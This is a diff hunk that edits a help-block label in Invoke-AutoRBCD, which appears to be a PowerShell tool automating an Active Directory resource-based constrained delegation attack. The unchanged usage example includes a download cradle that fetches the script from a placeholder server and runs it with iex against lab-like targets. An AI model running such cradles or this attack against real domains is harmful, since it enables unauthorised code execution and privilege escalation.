@@ -22,7 +22,7 @@ function Invoke-AutoRBCD{
      .Example
  	. ./AutoRBCD.ps1 | Invoke-AutoRBCD -WebServer 192.168.49.68 -Target appsrv01 -Domain prod.corp3.com
 
-     .Example2 
+     .Example 
 	(New-Object System.Net.WebClient).DownloadString("http:<serverip>/AutoRBCD.ps1") | iex; Invoke-AutoRBCD -WebServer 192.168.49.68 -Target appsrv01 -Domain prod.corp3.com
 
 #>
